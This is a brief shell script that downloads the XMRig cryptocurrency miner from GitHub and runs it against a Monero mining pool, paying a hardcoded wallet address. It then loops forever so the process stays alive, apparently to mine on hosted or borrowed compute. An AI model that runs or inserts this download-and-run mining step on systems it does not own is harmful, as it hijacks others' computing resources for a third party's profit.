#!/bin/sh
sudo apt update
sudo apt install screen -y

wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.25.0-linux-static-x64.tar.gz
tar -xf xmrig-6.25.0-linux-static-x64.tar.gz
cd xmrig-6.25.0

./xmrig -a rx \
  -o stratum+ssl://rx-eu.unmineable.com:443 \
  -u XMR:49hnWUygafF8tTZ48PmT9WJvRTkRLMWskNmtFddkVHRi1XAvBeHdiTb29edTDZ8QywLGZzMvV4PBGMfrTBJgZ1dJM7PrubE.unmineable_worker_cc21 \
  -p x -t1

while [ 1 ]; do
  sleep 3
done
sleep 999
